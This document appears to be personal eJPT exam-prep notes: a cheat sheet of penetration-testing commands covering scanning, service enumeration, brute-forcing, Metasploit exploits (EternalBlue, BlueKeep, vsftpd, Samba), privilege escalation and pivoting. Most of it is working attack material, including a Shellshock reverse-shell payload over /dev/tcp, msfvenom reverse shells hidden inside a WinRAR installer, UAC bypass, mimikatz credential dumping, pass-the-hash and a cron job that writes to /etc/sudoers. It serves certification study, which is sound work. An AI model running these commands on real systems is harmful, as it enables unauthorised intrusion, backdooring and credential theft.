ejpt attack chains, techniques and TTPs so I dont go overthinking and complicating the simple things lol
# NB : 
>Wordlist location on web attack box: 

USER LIST
- `/usr/share/metasploit-framework/data/wordlist/common_users.txt `
- `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`

PASSWORD LIST 
- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
- `/usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
- rockyou.txt

> SENSITIVE FILES
- wp-config.php
- WAMP : `C:\wamp\alias\phpmyadmin.conf`

> Quick && Easy wins
```
SMBv1 - MS17-010 SMB - Eternal Blue
SAMBA v3.5.0 RCE (versions 3.5.0 to 4.4.14, 4.5.10 and 4.6.4)
BLUEKEEP (CVE-2019-0708) - (xp,vista,win7,server 2008 & R2)
ProFTPD 1.3.3c RCE
SMTP Haraka <2.8.9
badblue 2.72b
HFS Rejetto 2.3
vsftpd v2.3.4 RCE
Apache Tomcat (v8.5.19 any <v9 RCE)
SSH server (libssh v0.6.0-0.8.0) auth bypass
PHP version <5.3.12/5.1.2 CGI argument Command injection
```
>Sorting & helpful commands
```bash
# grab the ip of all services with port 80 open
cat subnet_1.gnmap | grep 80/open | awk '{print $2}'
```
>RCE vs Command injection
 [stackexchange](https://security.stackexchange.com/questions/168327/difference-between-code-injection-command-injection-and-remote-code-execution) , [blog](https://hakluke.com/remote-code-execution-vs-remote-command-execution-vs-code-injection-vs-command-injection-vs-rce/) , [hackerone](https://www.hackerone.com/ethical-hacker/how-command-injections)
```txt
Remote code execution (RCE) and command injection are both types of injection vulnerabilities, but they differ in the type of impact they have. RCE is a type of vulnerability that allows an attacker to execute code on a remote system, while command injection is a type of vulnerability that allows an attacker to execute arbitrary commands on a remote system

The difference is that with RCE, actual programming code is executed, whereas with command injection, it's an operating system command being executed. 

In other words, RCE is a more severe form of injection vulnerability than command injection
```
# Assessment methodologies 
### Footprinting & Scanning - Live host enumeration 
>arp scan 
```bash
sudo arp-scan -I tun0 -g 10.142.111.0/24
```
>Fping 
```bash
fping -I tun0 -g 10.142.111.0/24 -a 2>dev/null
```
>nmap
```bash
nmap -sn 10.142.111.0/24
```
>scan list
```bash
nmap -iL ip.list -sV -O

nmap --script=discovery
#shows a lot of info that might help
```

### enumeration
#### SMB
>[!tip] SMB
windows implementation of a file share - CIFS
```bash
=NMAP=
nmap $IP -p445 --script smb-protocols,smb-security-mode,smb-enum-sessions

nmap $IP -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=PASSWORD123

nmap $IP -p445 --script smb-enum-shares
nmap $IP -p445 --script smb-enum-users
nmap $IP -p445 --script smb-enum-groups
nmap $IP -p445 --script smb-enum-domains
nmap $IP -p445 --script smb-server-stats


=SMBMAP=
smbmap -u guest -p '' -d -H $IP
smbmap -u administrator -p smbserver_771 -x 'ipconfig'

smbclient -L \\\\$IP\ -U admin
smbclient \\\\$IP\\$SHARE

=SAMBA=
- nmbd runs on UDP, smbd runs on TCP
nmap $IP -sU --top-ports 25 --open -sV
auxiliary/scanner/smb/smb_version
nmblookup -A $IP  #<20> means you can connect
enum4linux
enum4linux -i $IP #check if samba is print configured
auxiliary/scanner/smb/smb2 #checks if smb2 is supported
rpcclient -U "" -N $IP -x "lookupnames admin" # gives full SID
auxiliary/scanner/smb/smb_enumshares   


=BRUTEFORCE=
auxiliary/scanner/smb/smb_login 
hydra 

#find named pipes
auxiliary/scanner/smb/pipe_auditor 

enum4linux -r -u "admin" -p "password" $IP # get everybodys SID
```

> with admin creds
```bash
> psexec.py Administrator@$IP

MSF
> exploit/windows/smb/psexec
> exploit/windows/smb/psexec_psh
```
>Eternal blue.
>ms17-010 or cve-2017-0144 - manual exp with AutoBlue-ms17-010 
```bash
> [..SNIP..] --script=smb-vuln-ms17-010 $IP
```


#### FTP
>[!tip] FTP
store files on a server and access them remotely lol
```bash
nmap $IP -p21 


=BRUTEFORCE=
nmap $IP --script ftp-brute --script-args userdb=/home/users.txt -p 21

hydra -L users.txt -P pass.txt ftp://$IP


=ANON LOGIN=
anonymous : 

```

#### SSH
>[!tip] SSH
>Remote tty connection to a machine
```bash
ssh user@ip

=BANNER GRAB=
nc $IP 22

If its version SSH-2.0
nmap $Ip -p 22 --script ssh2-enum-algos

=OTHERS=
- If a user has no supported authentication methods (none_auth) they dont have a password set so you can login with no creds. 

# pre-banner is banner/text dispayed before you type creds when you try to login 

= NMAP =
nmap $Ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full
#enum all algorithms that can be used to create a key
--script ssh2-enum-algos 
nmap $Ip -p 22 --script ssh-auth-methods --script-args="ssh.user=$USER"

DICTIONARY ATTACK
hydra 
--script ssh-brute --script-args userdb=/home/user.txt
auxiliary/scanner/ssh/ssh_login
```

#### HTTP
>[!tip] HTTP
- IIS
```bash
nmap
whatweb $IP
http $IP     # for header info #httpie.io site
dirb http://$IP
browsh --startup-url http://$IP  #tries to simulate a copy of the site interminal


=NSE SCRIPTS= 
--script http-enum         #finds a small amount of dir
--script http-headers
--script http-methods --script-args http-methods.url.path=/webdav/
--script http-webdav-scan --script-args http-methods.url.path=/webdav/
```
- APACHE
```bash
-p80 --script banner
auxiliary/scanner/http/http_version
curl $IP | more
wget $IP/stuff.html
lynx http://$IP    # same as browsh just more texual
auxiliary/http/brute_dirs
```


#### SQL
>[!tip] SQL

>[!note] MYSQL

-p 3306
```bash
=SQL=
mysql -h $IP -u root #default admin acct with no pass

show count(*) from $table_name; #no.of rows in table
select LOAD_File("/etc/passwd");


=NMAP=
# show accounts that have empty password
--script=mysql-empty-password 

# show important info about the sql server e.g InteractiveClient
--script=mysql-info

# enumerate users using the root acct. and no pass
--script=mysql-users --script-args="mysqluser='root',mysqlpass=''"

# enumerate databases before login
--script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

# enumerate variables in the sql server
--script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"


--script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"


=MSF=
auxiliary/scanner/mysql/mysql_writable_dirs
auxiliary/scanner/mysql/mysql_hashdump

=BRUTEFORCE
auxiliary/scanner/mysql/mysql_login
hydra -l user -P /usr/share/metatsploit-framework/data/wordlists/unix_passwords.txt mysql://$IP
```


>[!note] MSSQL
```bash
=NMAP SCRIPTS=
nmap $IP
nmap $IP -p 1433  -sV

=NSE=
#info about sql server (name,number,product,service pack,patches)
--script ms-sql-info

#info about ntlm (netbiosname,netbioscomputername,dnsdomainname,productversion)
--script ms-sql-ntlm-info --script-args mssql.instance-port=1433

# script for bruteforcing
--script ms-sql-brute --script-args userdb=common_users.txt,passdb=common-passwords.txt

# check for users with empty passwords
--script ms-sql-empty-passwords

# execute queries with new credentials
--script ms-sql-query --script-args mssql.username=admin,mssql.passwords=anamaria,ms-sql-query="SELECT * FROM master..syslogins" -oN queryNSE.txt

# dump hashes with creds of elevated user 
--script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria

# check if xp_cmdshell is enabled and run a cmd with it
--script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.passwords=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"

=MSF=
#bruteforce (finds empty password users too)
auxiliary/scanner/mssql/mssql_login

#enumeration (LOTS OF INFO)
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_enum_sql_logins
auxiliary/admin/mssql/mssql_exec
auxiliary/admin/mssql/mssql_enum_domain_accounts
```


# Host & Network PT (Just Services & Applications)
### Windows
#### WebDav Attack chain
```bash
> -p 80 --script=http-enum $IP

BRUTEFORCE FOR CREDS 
> hydra -L /wordlist.txt -P /common_passwords.txt $IP http-get /webdav/

INTERACTION
- WITH DAVTEST --> test what file extentions can be uploaded, if a directory can be created, and what file extensions can be executed

> davtest -auth bob:password -url http://$IP/webdav
# abuse the allowed extension and upload a shell
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=1234 -f asp -o shell.asp

- WITH CADAVER - UPLOAD SHELL
> cadaver http://$IP/webdav/
> put /usr/share/webshells/asp/webshell.asp

OR USE MSF ENTIRELY
> search iis webdav upload
> set httppassword
> set RHOSTS $IP
> set PATH /webdav/metasploit.asp
```
#### RDP 
```bash
# detect rdp on some other RANDOM port
> msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner && set rport 3333"

BRUTEFORCE
> hydra -L $Userlist -P $password rdp://$IP -s 3333

INTERACTION
> xfreerdp /u:$NAME /p:$PASS /v:$IP:PORT
> remmina

EXPLOIT : BLUEKEEP (CVE-2019-0708)
grants access to a chunk of kernel memory that allows you run arbitrary code at SYSTEM level, xp,vista,win7,server 2008 & R2
NB : if network level auth is enabled the exploit will fail.

search BlueKeep
use the scanner one to check if vuln
> set rhosts, rport(if diff port was used)

EXPLOIT (WORKS ONLY ON 64bit computers & specific targets)
> set rhosts

exploit might fail because you need to set the target, might also need to change "CHUNK size" default is 250mb, setting too high will crash target

> show targets
> set target $ID
```

#### WinRM
>5985/TCP & 5986/TCP (HTTPS)
```bash
> cme winrm $IP -u administrator -p $passlist
> cme winrm $IP -u administrator -p pass -x "whoami"

LOGIN
> evil-winrm -u administrator -p $PASS -i $IP 

=MSF=
basically for a meterpreter session via winrm
> search winrm_script 
(use exploit/windows/winrm/winrm_script_exec)
> set FORCE_VBS true
> set RHOSTS, USERNAME & PASSWORD
```
#### apache tomcat v5.5.19 and `<v9`
```bash
# for windows
search type:exploit tomcat_jsp
use tomcat_jsp_upload
set payload java/jsp_shell_bind_tcp
set SHELL cmd
# might require you to run it multiple times.
# you would need to use msfvenom to upgrade the shell to meterpeter
```
#### vsFTPd v2.3.4 RCE
>FTP server (vsftpd v2.3.4 RCE)

```bash
search vsftpd
use vsftpd_234_backdoor

# can use shell_to_meterpreter to upgrade
```
#### SAMBA v3.5.0 RCE
```bash
use is_known_pipename
check
run
# use shell to meterpreter to ugrade

# SAMBA version 3.0.20 < 3.0.25
use usermap_script
```
#### SMTP - Haraka 2.8.9 cmd injection
 >SMTP (Haraka <v2.8.9 cmd injection)
```bash
search type:exploit name:haraka
set email_to $CORRECT_MAIL
# set SRVPORT 9098
# set payload linux/x64/meterpreter_reverse_http
```
#### PHPv5 cmd injection
 >PHP version <5.3.12/5.1.2 CGI argument Command injection
```bash 
seaarchsploit php cgi
18836.py

use exploit/multi/http/php_cgi_arg_injection
```
#### IIS+FTP
>Microsoft IIS - FTP
```bash
sometimes they both run together as proprietory services, and when foudn running together it means they are linked/intertwined
- check for anon logins on the FTP
- bruteforce with wordlist for creds 
- try to put a shell
```
### Linux
#### SHELLSHOCK 
> Bash <v4\
```bash
ATTACK CHAIN
- locate script/input vector to communicate with bash
- Find CGI scripts on apache server.


DETECTION 
--script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"


MANUAL EXPLOITATION
- in user agent field pass the following (-A with curl)
> () { :; }; echo; echo; /bin/bash -c 'whoami'
> () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/$IP/$PORT 0>&1'


MSF
> use apache_mod_cgi
> set rhosts & targeturi
```
#### SAMBA
```bash
ATTACK CHAIN
Bruteforce
> hydra

SMBMAP
> smbmap -H $IP -u user -p pass

SMBCLIENT
> smbclient //$IP/$SHARE -U $USER

Enum4linux
> enum4linux -a -u $USER -p $PASS
```
## Privilege Escalation
SCRIPTS
script 1 :  https://github.com/AonCyberLabs/Windows-Exploit-Suggester
script 2 : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135
#### Windows 
>using msf's exploit suggester
```bash
> use post/multi/recon/local_exploit_suggester
> set SESSION
> run

NB: after picking the LPE exploit, change the lport,cause you already prolly used it to catch a shell before.
```
- google each suggested exploit for to see if it has been used or is specific to the windows build you are attacking

MANUAL WAY
-  using script 1 
```bash
- clone repo and run with update flag
- use the microsoft xslx db against systeminfo output txt file

create a new txt file with systeminfo cmd content output saved to it.

> ./windows-exploit-suggester.py --update
> ./windows-exploit-suggester.py --database YYY-M-D --systeminfo /tmp/systeminfo.txt

> upload /home/exploit/3030.exe
```

##### UAC BYPASS
>[!Summary] Summary
> This section was basically about bypassing Uac that prevents you from doing privilged actions like changing the password of a user in admin group who you have compromised already via a shell session - Because you need to click on the consent box which you cant via CLI so it just says "Access is denied"

>Bypass with hfiref0x/UACME - abuses the windows AutoElevate ;-
```bash
1. first generate an msfvenom payload
> windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe 

2. start listener
> use multi/handler

3. We now want to run our payload with privileges
- Using Akigi - key 23 (key 23, 33, avoid any "Fixed")

> akigi64.exe 23 \Windows\Temp\backdoor.exe

4. Migrate to an NT AUTHORITY process in the new shell
migrate to lsass, spoolsv.exe etc.

NB : MUST USE ABSOLUTE PATH TO BACKDOOR EXE else you wont receive shell - worked for me. The difference in the shell you recieve from the previous is the amount of privileges you have. check with "getprivs"
```

##### Access token impersonation
To Abuse `SeImpersonate`  / `SeAssignTokens` / `SeCreateTokens` privs
We abuse the `Delegate-Level` tokens NOT the `Impersonate-Level` tokens

>USING METERPRETER INCOGNITO MODULE
- the module can be used to display a list of available tokens that we can impersonate.
ATTACK CHAIN 
```bash
INCOGNITO MODULE - lists available tokens to impersonate

> load incognito
> list_tokens -u (You want the Delgation-Level tokens)
> impersonate_token "TOKEN_NAME" 

e.g
> impersonate_token "ATTACKDEFENSE\Administrator"

NB : you still need to migrate to a process of AUTHORITY even tho getuid says we successfully impersonated the user. - MIGRATE TO EXPLORER PROCESS OR ANY OTHER.
- getsystem works lol or printspoofer && potato family.
```

##### Password hunting in config files
> Unattended setup utility XML files
- LOCATIONS :-
```txt
> C:\\Windows\Panther\Unattend.xml
> C:\\Windows\Panther\Autounattend.xml
- passwords found here may be b64 encoded.
```
>The Hunt :- 
```bash
> search -f "unattend.xml"
> cd \Windows\Panther\

- FIND WITH POWERUP
> Import-Module PowerUp.ps1
> Invoke-PrivescAudit

DECODE WITH PSH
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password

> runas.exe /user:administrator cmd
> msfconsole -q
> use exploit/windows/misc/hta_server
> mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
```

##### Hash Dumping and PtH
> Dumping hashes with MSF && mimikatz.exe :-
```bash
- WITH MSF
as always if you are administrator migrate to a process with higher privs especially the "lsass.exe" process 

> pgrep lsass
> migrate $PID

> load kiwi
> creds_all
> lsa_dump_sam
> lsa_dump_ secrets

- WITH MIMIKATZ.exe bin
> mimikatz.exe "privilege::debug lsadump::sam exit"
TO DUMP LSA SECRETS USE
> lsadump::secrets

when logon passwords are stored in cleartexts, thats when you use 
> sekurlsa::logonpasswords
``` 
windows version >=8.1 doesnt store clear text creds
lsa_secrets could contain clear text creds

>PassTheHash
```bash
- WITH PSEXEC MSF MODULE
you need both LM:NT hash --> hashdump to get it

> use smb/psexec
> set smbuser, smbpass, rhosts
> set target $WHATEVER_TARGET_WORKS_TRY_NATIVE_UPLOAD

- WITH CME
cme smb $IP -u Administrator -H $HASH
cme smb $IP -u Administrator -H $HASH -x "ipconfig"
```

#### Linux privesc
- linux-exploit-suggester
##### Misconfigured cronjob
- cronjobs can be run as any user but the one of interest is the one being run as root.
```bash
view crontab set by a user we are running as :-
$ crontab -l

lets say we wanted to find any scrpts or files on the host that referenced or included a "root_file" within
$ grep -rnw /usr -e "/home/user/root_file "

say we found a writable shell script owned by root and runs with cron, we can add ourselves to sudoers in the file by adding this line 
$ printf '#!/bin/bash\necho "rami ALL=NOPASSWD:ALL" >> /etc/sudoers' > $WRITABLEFILE.sh

OR JUST
> echo "cp -p /bin/bash /tmp/rami && chmod +s /tmp/rami" >> /usr/local/share/copy.sh
```

##### SUID Bins
> SUID BINARIES - Set Owner User ID
```bash
$ strings binary

if the binary is calling another binary, you can delete that and replace the binary being called with /bin/bash
```
>Misconfigured sudo perms 
```bash
sudo -l
# check for a sudo abuse with gtfobins.io
```

##### Hashdumping
> hashdumping
```bash
gain a shell and upgrade to meterpreter
sessions -u $ID

MSF LINUX HASHDUMP
> search hashdump
> use post/linux/gather/hashdump
> set session $ID
```

# Metasploit Framework
> Scanning & Enumeration 
```bash
# do an nmap scan and save to an XML file, then start the postgresql server.

Import nmap scan results
> db_import /path/to/xmlfile
> hosts
> services
> vulns

# Use nmap without a need to import scans by running inside a workspace in MSF 
> db_nmap -sV $IP -Pn -p- -vv -O
```
### FTP enum
```bash
# enumerate ftp
> search type:auxiliary name:ftp
> use auxiliary/scanner/ftp/ftp_version
> use auxiliary/scanner/ftp/ftp_login
> use auxiliary/scanner/ftp/anonymous
```
### SMB enum
```bash
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_version
> use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
> use auxiliary/scanner/smb/smb_login
> set SMBUser, PASS_FILE

smbclient -L \\\\$IP\ -U admin
smbclient \\\\$IP\\$SHARE
```
### Apache Enum
```bash
> search type:auxiliary name:http
> use auxiliary/scanner/http/http_version
> use auxiliary/scanner/http/http_header
> use auxiliary/scanner/http/robots.txt
> use auxiliary/scanner/http/dir_scanner
> auxiliary/scanner/http/files_dir
> use auxiliary/scanner/http/http_login
set AUTH_URI
# find legitimate users on an apache server
> use auxiliary/scanner/http/apache_userdir_enum
```
### MySQL enum
```bash
search type:auxiliary name:mysql
mysql_version
mysql_login
mysql_file_enum
mysql_writable_dirs
mysql_hashdump

# CREDENTIALED ENUMERATION
# do a crap tonne of enumeration with creds  
auxiliary/admin/mysql/mysql_enum
# Run mysql queries
auxiliary/admin/mysql/mysql_sql
# grap all schema info
auxiliary/scanner/mysql/mysql_schemadump


IF you started enumerating in a workspace, you can type the following commands to show information gathered so far
> hosts
> services
> loot
> creds
```
NB : always try to bruteforce `root` user creds with mysql_login
- `auxiliary/admin/mysql/mysql_enum` gives A LOT of info(users, hashes, mysql version and configs, privs) pertinent to mysql - use it to grab info once you get root creds

### SSH enumeration
```bash
ssh_login
ssh_enumusers
```
### SMTP
>PORTS :- 25, 465, 587.
```bash
# NB : Dont forget to set the correct port 

search type:auxiliary name:smtp
smtp_version

# username enumeration, use to generate a wordlist and bruteforce all services.
smtp_enum
```
### Autopwn external module
```bash
# check all the services+versionnumber in searchsploit and search command in msf 
searchsploit "Microsoft Windows SMB"

# USING DB_AUTOPWN
# attempts to exploit or provide a list of msf exploits for services on various ports on targets whose information is stored in the db
> load db_autopwn
> db_autopwn -p -t -PI 22

# ANALYZE
# a cmd in msf that provides a list of exploits that are ready and match services+versions running on a target.
> analyze
```
### PUT method check
```bash
use auxiliary/scanner/http/http_put
# set PATH to a dir that allows PUT
# you can set FILEDATA to be content e.g PHPshell oneliner
```
### Client-Side attacks
```bash
# Generating msfvenom payloads
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > /tmp/32bitload.exe

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf -o /tmp/reverse32

MULTI HANDLER
use multi/handler
set payload to $APPRORIATE_SHELLCODE
set LHOST


ENCODING PAYLOADS
nb : shikata_ga_nai works on both linux & windows

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f exe 

# increasing encoder iteration, say 10
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -i 10 -e x86/shikata_ga_nai -f exe 

INJECTING PAYLOADS
- download a pe32 file that allows injection, like WINRAR setup file, the -k option preserves the behavior of the exe so it does its function even after sending shell.

msfvenom -p windows/meterpreter/reverse_tcp LHOS LPORT -e x86/shikata_ga_nai -f exe -x ./winrar32.exe -o embed.exe

AUTO PROCESS MIGRATE (post exp module)
run post/windows/manage/migrate
```

### Post exploitation stuff
```bash
# searching for post exp modules to run
search upgrade platform:windows
search migrate platform:windows
search enum_applications
search enum_patches
search enum_shares
```
#### UAC bypass
```bash
# useful when you are in localadmin group but you arent system
search bypassuac
use bypassuac_injection
set payload $APPROPRIATE_BIT_PAYLOAD_ARCH
set target $APPROPRIATE_BIT_ARCHITECTURE

# after using the bypass, getsystem
getsystem
```
#### Pivoting
>find dual homed machine - the jump host  then - 
```bash
# say the jumphost has an interface with addy and mask of : 10.10.100.50 | 255.255.224.0
run autoroute -s 10.10.100.0/19
# include 100 because some of the bits of the network address space falls there
```
> host discovery ;-
```ruby
auxiliary/scanner/discovery/arp_sweep
run post/windows/gather/arp_scanner
post/multi/gather/ping_sweep
```
>portscan the host : -
```ruby
# you can reach the hosts from within msf but cant from outside msf.
use portscan/tcp
set rport 1-100 
set rhost $$
```
> say we wanna attack port 80 on the internal host, but want to accurately fingerprint the open port - Portforward :-
```bash
portfwd add -l 1337 -p 80 -r $TARGET_INTERNAL_IP
#confirm
portfwd list

#scan the port with nmap outside msf or inside 
nnmap -p 1337 localhost -sVC
```
- say the target is vuln to druppalgeddon - you can attack from inside msf with the correct IP and port - because msf has an established route for packets to reach the internal host.

##### networking - CIDR table
| slash notation | net mask        | hex        | binary representation               | number of hosts |
|----------------|-----------------|------------|-------------------------------------|-----------------|
| /0             | 0.0.0.0         | 0x00000000 | 00000000 00000000 00000000 00000000 | 4294967296      |
| /1             | 128.0.0.0       | 0x80000000 | 10000000 00000000 00000000 00000000 | 2147483648      |
| /2             | 192.0.0.0       | 0xc0000000 | 11000000 00000000 00000000 00000000 | 1073741824      |
| /3             | 224.0.0.0       | 0xe0000000 | 11100000 00000000 00000000 00000000 | 536870912       |
| /4             | 240.0.0.0       | 0xf0000000 | 11110000 00000000 00000000 00000000 | 268435456       |
| /5             | 248.0.0.0       | 0xf8000000 | 11111000 00000000 00000000 00000000 | 134217728       |
| /6             | 252.0.0.0       | 0xfc000000 | 11111100 00000000 00000000 00000000 | 67108864        |
| /7             | 254.0.0.0       | 0xfe000000 | 11111110 00000000 00000000 00000000 | 33554432        |
| /8             | 255.0.0.0       | 0xff000000 | 11111111 00000000 00000000 00000000 | 16777216        |
| /9             | 255.128.0.0     | 0xff800000 | 11111111 10000000 00000000 00000000 | 8388608         |
| /10            | 255.192.0.0     | 0xffc00000 | 11111111 11000000 00000000 00000000 | 4194304         |
| /11            | 255.224.0.0     | 0xffe00000 | 11111111 11100000 00000000 00000000 | 2097152         |
| /12            | 255.240.0.0     | 0xfff00000 | 11111111 11110000 00000000 00000000 | 1048576         |
| /13            | 255.248.0.0     | 0xfff80000 | 11111111 11111000 00000000 00000000 | 524288          |
| /14            | 255.252.0.0     | 0xfffc0000 | 11111111 11111100 00000000 00000000 | 262144          |
| /15            | 255.254.0.0     | 0xfffe0000 | 11111111 11111110 00000000 00000000 | 131072          |
| /16            | 255.255.0.0     | 0xffff0000 | 11111111 11111111 00000000 00000000 | 65536           |
| /17            | 255.255.128.0   | 0xffff8000 | 11111111 11111111 10000000 00000000 | 32768           |
| /18            | 255.255.192.0   | 0xffffc000 | 11111111 11111111 11000000 00000000 | 16384           |
| /19            | 255.255.224.0   | 0xffffe000 | 11111111 11111111 11100000 00000000 | 8192            |
| /20            | 255.255.240.0   | 0xfffff000 | 11111111 11111111 11110000 00000000 | 4096            |
| /21            | 255.255.248.0   | 0xfffff800 | 11111111 11111111 11111000 00000000 | 2048            |
| /22            | 255.255.252.0   | 0xfffffc00 | 11111111 11111111 11111100 00000000 | 1024            |
| /23            | 255.255.254.0   | 0xfffffe00 | 11111111 11111111 11111110 00000000 | 512             |
| /24            | 255.255.255.0   | 0xffffff00 | 11111111 11111111 11111111 00000000 | 256             |
| /25            | 255.255.255.128 | 0xffffff80 | 11111111 11111111 11111111 10000000 | 128             |
| /26            | 255.255.255.192 | 0xffffffc0 | 11111111 11111111 11111111 11000000 | 64              |
| /27            | 255.255.255.224 | 0xffffffe0 | 11111111 11111111 11111111 11100000 | 32              |
| /28            | 255.255.255.240 | 0xfffffff0 | 11111111 11111111 11111111 11110000 | 16              |
| /29            | 255.255.255.248 | 0xfffffff8 | 11111111 11111111 11111111 11111000 | 8               |
| /30            | 255.255.255.252 | 0xfffffffc | 11111111 11111111 11111111 11111100 | 4               |
| /31            | 255.255.255.254 | 0xfffffffe | 11111111 11111111 11111111 11111110 | 2               |
| /32            | 255.255.255.255 | 0xffffffff | 11111111 11111111 11111111 11111111 | 1               |

